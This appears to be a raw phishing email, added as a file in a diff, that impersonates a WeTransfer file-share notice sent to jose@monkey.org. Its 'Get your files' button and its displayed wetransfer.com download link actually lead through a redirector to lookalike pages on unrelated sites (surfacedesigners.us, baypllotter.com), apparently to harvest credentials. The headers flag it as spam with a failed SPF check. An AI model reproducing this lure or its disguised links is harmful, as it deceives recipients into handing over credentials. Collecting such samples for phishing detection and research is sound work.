@@ -1,0 +1,263 @@
+Return-Path: wetracleanyes@clinx.space
+Delivered-To: jose@monkey.org
+X-FDA: 83905051146.07.0F4ED80
+Received: from clinx.space (clinx.space [62.106.66.142])
+	by imf04.b.hostedemail.com (Postfix) with ESMTP id 041F4160004
+	for <jose@monkey.org>; Fri, 19 Sep 2025 06:40:31 +0000 (UTC)
+Authentication-Results: imf04.b.hostedemail.com;
+	dkim=pass header.d=clinx.space header.s=dkim header.b=SLj1YSms;
+	spf=pass (imf04.b.hostedemail.com: domain of wetracleanyes@clinx.space
+ designates 62.106.66.142 as permitted sender)
+ smtp.mailfrom=wetracleanyes@clinx.space;
+	dmarc=pass (policy=reject) header.from=clinx.space
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1758264032;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=i1C0jayxZAJnjRQ0/B+oeRdmMkO223ziecIp0bYOWbU=;
+	b=c1rpa+7uVFWPSHy41w93pcBF3cSozX0Gcp3qpEaymWw+y/j/FnTM0HZvhykUtDypTv+wxU
+	MqQhz9bkoLnCyFhIG7HB8xPknynvcBkubp9xyTRujawbieGTOo1cpQIZHC6AAWhcjTo3C2
+	T7zX6MXTFoomWSGRCfXLqUdqasm+fZE=
+ARC-Authentication-Results: i=1;
+	imf04.b.hostedemail.com;
+	dkim=pass header.d=clinx.space header.s=dkim header.b=SLj1YSms;
+	spf=pass (imf04.b.hostedemail.com: domain of wetracleanyes@clinx.space
+ designates 62.106.66.142 as permitted sender)
+ smtp.mailfrom=wetracleanyes@clinx.space;
+	dmarc=pass (policy=reject) header.from=clinx.space
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1758264032; a=rsa-sha256;
+	cv=none;
+	b=7nuX0EgFrQipNPUBL5cIN0DyXDFv/bH/jkI2VxY9hXLKOBWIvBzV+SjOVFmZ1lghC0TYjk
+	xR2gkaB0ACHmL29CxK5H012qsKzOkXwf79pa0LhTg1zpfbsR8zv18lwr04wmGgGz0NCPWN
+	GcvTg0jwdjUojxj69uCxqvqfz/bIw2c=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=clinx.space
+	; s=dkim; h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:
+	Reply-To:Cc:Content-Transfer-Encoding:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=i1C0jayxZAJnjRQ0/B+oeRdmMkO223ziecIp0bYOWbU=; b=SLj1YSmslTFhj8qvJf/6PHXznz
+	jRs5+uFuEgVtZ7udFpSgbZ+gRD9dTeQfM+WELczVicjhDo7B11NSOG0GrDNg0hz4v72FWtFWTV2vw
+	7/s1nxsmZCDXXX8vxmpx6+mc2bNNEspEeFgAK7fLjeeY81jlw6I6N/9QYOBuF/XONqmo=;
+Received: from [160.25.72.199]
+	by clinx.space with esmtpa (Exim 4.97)
+	(envelope-from <wetracleanyes@clinx.space>)
+	id 1uz7yo-00000002JkL-18jS
+	for jose@monkey.org;
+	Thu, 18 Sep 2025 06:18:54 +0000
+From: ''We Transfer'' <wetracleanyes@clinx.space>
+To: jose@monkey.org
+Subject: You have received files via WeTransfer jose@monkey.org
+Date: 18 Sep 2025 13:18:53 +0700
+Message-ID: <20250918131853.DE31ADEA56684715@clinx.space>
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	boundary="----=_NextPart_000_0012_1F8175EA.A4DFC360"
+X-SPF-Fail: YES
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 041F4160004
+X-Rspamd-Server: rspam04
+X-Spam-Status: Yes, score=15.11
+X-Stat-Signature: zuh91k73qcq4iq1eae1bfdoqh4zarrza
+X-HE-Tag: 1758264031-570481
+X-HE-Meta: 
+ U2FsdGVkX1810oQY3dibLxl+Fiwudiue4ltAHXWFSocSKYpCMPw5FRB72VpOTU7hQ91bsOFC092frgmbWlqhZtmB8cbQNZ0Pd3+nm8tett1v5E6JlBWlA1TxjFPaJhae7fXKZOLUyL/ZTe3+B5htgk0fz9SFBA4BwcEMwQWtVW85ZcuNl9ov8GWV8UwxheamKLxXiczPBVHk2B/lUi4j6NJNe7utffHrBq5mfsT9kqwiNe1qgV4getHHY+5Ht01K39QcYMe7rjOVLWluT91eScaGzo/kC0NEUy/OKIrS2Cx/Q56+Fce7z68PcyNYEBLJTGb38SMCldJYarfhnYFBDfAjp1YLXDLxSP+tq+ifuWvTGA3qMDIbRbevViYdZW0g5UPBpD8AZ7wIrY7BOvjUnYcV6ocwKkZ14qqpYgtJtnJJGyKKdwu3eRKkCQPOeasyzeioK9Zre3Q/D7OR8/23fgTNgTH13C8B/QaBr+av978LBPwDGaYVPQy1F3axyZM9QlUcSLf+rbTW6qCwo2T2WmfM0tglIU2FyDNG6nHPba9oJkan8G+xt8HLXLJF8tq/7kmbpsEl301V4sq+zcoAwbgwim/l2sGnAM5fSGdFRjvf8aY8URrarpCfk5ApSWmynAJFfUo7Ta4UNeaKRljHKFGaxtL5kVPIQdyBfQvLN8C/p77Tdli6IfftZ9jA+DqWa2DFrZ0YhMwCaffasLjwPPZLbSuXm2+nmrk1yI6nR5LMSfcE4KUj1CdqFkkdhhJrDxwHUyei+iiz8afykfbfbb6jiIN2dhK0odmH3pAKRmg9lf92XjXUSrFI31kaN/wGq1YoIxPastcB2eY1EwMgEP8SI0lKPn2t5EzWWFFw2SaZI9nFbX/EQtO6OmGuqlJuBqRw8Detcxkp4tT9M1dbqBqlXzxayoYaUPYJ6m5HrRmHL2837tk1iYObEM+sDyL0jqYkPKa2wVXRCEdZkcCGSaTxuuk
+ IcET0x6Z1niKBc6YBalyiao0upLr4xq/n5X5UVOVn0WawIKAZV5iS+vXgzq43fKCWkqoXM6evExYIK1AHCyFziVkW7WBpC9fTWjqPkd0i9OO0dQwdyEuW7UWeEBap+3ggwAm9+dhUNrVB/4quG6S5cpiU7jUH6yE9mXmRTYfVniE46EqBSEOCSTDc8Ce7T9v29x3Zy+hIh+9pKT3CbNRIYRIm4AhsqyEsInTPXbRbKwJOA/cx19cGCsWcgFoIovk/OqS5O0np0B+i3ffDd7qMu3Hf+GLpQNN0hOVhIDpXL9vvyBKQhEKg14oGbpuAB5U8PN7G7HlmNmSzPOYCrnKfnq+80SNVd3FR8jrE70asJkqDuk/GvB0U3i+/xU/SO4qR7ZLvqxWoSFwtqb4WiWHGfywb1v1gTLE7K4jv+PNSoKzwba5vK/B+eKlCNMhinpbQUZvLKZvB6N8CwGIv9nIlZtlzQIRRbRUnperg
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 366
+
+
+------=_NextPart_000_0012_1F8175EA.A4DFC360
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<table style=3D"margin: 0px; padding: 0px; width: 600px; color: rgb(36, 36,=
+ 36); text-transform: none; line-height: inherit; letter-spacing: normal; f=
+ont-family: Arial, Helvetica, sans-serif; font-size: 15px; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; border-collap=
+se: collapse; table-layout: fixed; border-spacing: 0px; orphans: 2; widows:=
+ 2; font-stretch: inherit; font-feature-settings: inherit; background-color=
+: rgb(244, 244, 244); font-variant-ligatures:=20
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial; font-variant-numeric: inherit; font-variant-east-asian: in=
+herit; font-kerning: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0"><tbody><tr><td align=3D"left" valign=3D"top" style=3D"margin: 0px; p=
+adding: 55px 0px 0px; width: 600px;">
+<table style=3D"font: inherit; margin: 0px; padding: 0px; width: 600px; bor=
+der-collapse: collapse; table-layout: fixed; border-spacing: 0px; font-size=
+-adjust: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody><tr><td align=3D"left" valign=3D"top" style=3D"backg=
+round: no-repeat 50% 50% / cover; margin: 0px; padding: 0px; width: 600px; =
+font-size: 10px;" bgcolor=3D"#5268ff"><center>
+<table align=3D"center" style=3D"font: inherit; margin: 0px auto; padding: =
+0px; width: auto; border-collapse: collapse; table-layout: fixed; border-sp=
+acing: 0px; font-size-adjust: inherit; font-stretch: inherit;" border=3D"0"=
+ cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td height=3D"16" align=3D"=
+left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width: 56px; heigh=
+t: 16px;">
+<table align=3D"center" style=3D"font: inherit; margin: 0px auto; padding: =
+0px; width: auto; border-collapse: collapse; table-layout: fixed; border-sp=
+acing: 0px; font-size-adjust: inherit; font-stretch: inherit;" border=3D"0"=
+ cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td height=3D"11" align=3D"=
+left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width: 56px; heigh=
+t: 11px;"></td></tr></tbody></table><strong></strong></td></tr><tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 56px;">
+<a title=3D"https://ctrk.klclick3.com/l/01JV2CTHN5NPNS5FJRA84VG3VS_0#cmF5c3=
+VzdGFsYUB6cmlkZXJzLmNvbQ=3D=3D" style=3D"border-width: 0px; border-color: c=
+urrentColor; font: inherit; margin: 0px; padding: 0px; color: rgb(17, 85, 2=
+04); vertical-align: baseline; font-size-adjust: inherit; font-stretch: inh=
+erit;" href=3D"https://ctrk.klclick3.com/l/01JV2CTHN5NPNS5FJRA84VG3VS_0#cmF=
+5c3VzdGFsYUB6cmlkZXJzLmNvbQ=3D=3D" target=3D"_blank" rel=3D"noopener norefe=
+rrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ctrk.klclick=
+3.com/l/01JV2CTHN5NPNS5FJRA84VG3VS_0%23cmF5c3VzdGFsYUB6cmlkZXJzLmNvbQ%3D%3D=
+&amp;source=3Dgmail&amp;ust=3D1756894776296000&amp;usg=3DAOvVaw1bo7a8v0Du61=
+3KqLwTQD8V"><img width=3D"225" height=3D"224" style=3D"border-color: rgb(0,=
+ 0, 0); width: 128px; height: 62px;" src=3D"cid:download.png"><br></a></td>=
+</tr><tr><td height=3D"11" align=3D"left" valign=3D"top" style=3D"margin: 0=
+px; padding: 0px; width: 56px; height: 11px;">
+</td></tr></tbody></table></center></td></tr></tbody></table></td></tr></tb=
+ody></table>
+<table style=3D"margin: 0px; padding: 0px; width: 600px; color: rgb(36, 36,=
+ 36); text-transform: none; line-height: inherit; letter-spacing: normal; f=
+ont-family: Arial, Helvetica, sans-serif; font-size: 15px; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; border-collap=
+se: collapse; table-layout: fixed; border-spacing: 0px; orphans: 2; widows:=
+ 2; font-stretch: inherit; font-feature-settings: inherit; font-variant-lig=
+atures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial; font-variant-numer=
+ic: inherit; font-variant-east-asian: inherit; font-kerning: inherit;" bgco=
+lor=3D"#ffffff" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr=
+><td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; widt=
+h: 600px;">
+<table style=3D"font: inherit; margin: 0px; padding: 0px; width: 600px; bor=
+der-collapse: collapse; table-layout: fixed; border-spacing: 0px; font-size=
+-adjust: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody><tr><td align=3D"left" valign=3D"top" style=3D"margi=
+n: 0px; padding: 0px; width: 600px;">
+<table style=3D"font: inherit; margin: 0px; padding: 0px; width: 600px; bor=
+der-collapse: collapse; table-layout: fixed; border-spacing: 0px; font-size=
+-adjust: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody><tr><td align=3D"center" valign=3D"top" style=3D"mar=
+gin: 0px; padding: 60px 80px 0px; width: 440px; color: rgb(23, 24, 26); lin=
+e-height: 30px; font-size: 26px;">
+<span style=3D"border-width: 0px; border-color: currentColor; font: inherit=
+; margin: 0px; padding: 0px; color: rgb(82, 104, 255); vertical-align: base=
+line; font-size-adjust: inherit; font-stretch: inherit;">jose@monkey.org</s=
+pan><br><span style=3D"border-width: 0px; border-color: currentColor; font:=
+ inherit; margin: 0px; padding: 0px; color: inherit; vertical-align: baseli=
+ne; display: inline-flex; font-size-adjust: inherit; font-stretch: inherit;=
+">Document shared via WeTransfer</span></td></tr><tr>
+<td align=3D"left" valign=3D"top" style=3D'margin: 0px; padding: 50px 80px =
+0px; width: 440px; color: rgb(121, 124, 127); line-height: 24px; font-famil=
+y: "Fakt Pro", "Segoe UI", "SanFrancisco Display", Arial, sans-serif; font-=
+size: 14px;'></td></tr><tr><td align=3D"left" valign=3D"top" style=3D"margi=
+n: 0px; padding: 40px 160px; width: 280px;">
+<table style=3D"font: inherit; margin: 0px; padding: 0px; width: 280px; bor=
+der-collapse: collapse; table-layout: fixed; border-spacing: 0px; font-size=
+-adjust: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody><tr><td align=3D"left" valign=3D"top" style=3D"margi=
+n: 0px; padding: 0px; width: 280px;">
+<a title=3D"https://texastexas.com/index/indxx.html?rfavgrqwcdlzlnrif" styl=
+e=3D"border-width: 0px; border-color: currentColor; margin: 0px; padding: 1=
+5px 20px; border-radius: 25px; text-align: center; color: rgb(255, 255, 255=
+); line-height: inherit; font-family: inherit; font-size: 14px; font-style:=
+ inherit; font-variant: inherit; font-weight: inherit; vertical-align: base=
+line; display: block; font-stretch: inherit; font-feature-settings: inherit=
+; background-color: rgb(82, 104,=20
+255); font-kerning: inherit; text-decoration-line: none;" href=3D"https://l=
+=2Ewl.co/l?u=3Dhttps://surfacedesigners.us/wp-includes/images/Wetr/index.ht=
+ml" target=3D"_blank" rel=3D"noopener noreferrer" data-saferedirecturl=3D"h=
+ttps://www.google.com/url?q=3Dhttps://l.wl.co/l?u%3Dhttp://baypllotter.com/=
+Drive/wetr.html&amp;source=3Dgmail&amp;ust=3D1756894776296000&amp;usg=3DAOv=
+Vaw2NF3lvJXDY6zChQmml85T9">Get your files</a></td></tr></tbody></table></td=
+></tr><tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 40px 80px =
+0px; width: 440px;"><table style=3D"font: inherit; margin: 0px; padding: 0p=
+x; width: 440px; border-collapse: collapse; table-layout: fixed; border-spa=
+cing: 0px; font-size-adjust: inherit; font-stretch: inherit;" border=3D"0" =
+cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 440px; line-height: 0; font-size: 1px; border-bottom-color: rgb(244, 244,=
+ 244); border-bottom-width: 2px; border-bottom-style: solid;">&nbsp;</td></=
+tr></tbody></table></td></tr><tr><td align=3D"left" valign=3D"top" style=3D=
+'margin: 0px; padding: 50px 80px 0px; width: 440px; color: rgb(121, 124, 12=
+7); line-height: 24px; font-family: "Fakt Pro", "Segoe UI", "SanFrancisco D=
+isplay", Arial, sans-serif; font-size: 14px;'>
+<span style=3D"border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; color: rgb(23, 24, 26); line-height: inherit; font-family: in=
+herit; font-size: 18px; font-style: inherit; font-variant: inherit; font-we=
+ight: inherit; vertical-align: baseline; font-stretch: inherit; font-featur=
+e-settings: inherit; font-kerning: inherit;">Download Link</span><br>
+<a title=3D"https://texastexas.com/index/indxx.html?tmnfgdkwtosnxq" style=
+=3D"border-width: 0px; border-color: currentColor; font: inherit; margin: 0=
+px; padding: 0px; color: rgb(23, 24, 26); vertical-align: baseline; font-si=
+ze-adjust: inherit; font-stretch: inherit;" href=3D"https://l.wl.co/l?u=3Dh=
+ttps://surfacedesigners.us/wp-includes/images/Wetr/index.html" target=3D"_b=
+lank" rel=3D"noopener noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://l.wl.co/l?u%=
+3Dhttp://baypllotter.com/Drive/wetr.html&amp;source=3Dgmail&amp;ust=3D17568=
+94776296000&amp;usg=3DAOvVaw2NF3lvJXDY6zChQmml85T9"><span style=3D"border-w=
+idth: 0px; border-color: currentColor; font: inherit; margin: 0px; padding:=
+ 0px; color: rgb(82, 104, 255); vertical-align: baseline; font-size-adjust:=
+ inherit; font-stretch: inherit;">https://wetransfer.com/<wbr>downloads/ e6=
+bb0ac1d0846e7c5b297e98002705<wbr>a320241002040704/<wbr>
+477e948a81ad20ee949e2b81f516f1<wbr>5520241002040806/f657c1</span></a></td><=
+/tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>
+
+
+</body></html>
+------=_NextPart_000_0012_1F8175EA.A4DFC360
+Content-Type: image/png; name="download.png"
+Content-Transfer-Encoding: base64
+Content-ID: <download.png>
+Content-Disposition: inline; filename="download.png"
+
+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
+RK5CYII=
+
+------=_NextPart_000_0012_1F8175EA.A4DFC360--
+
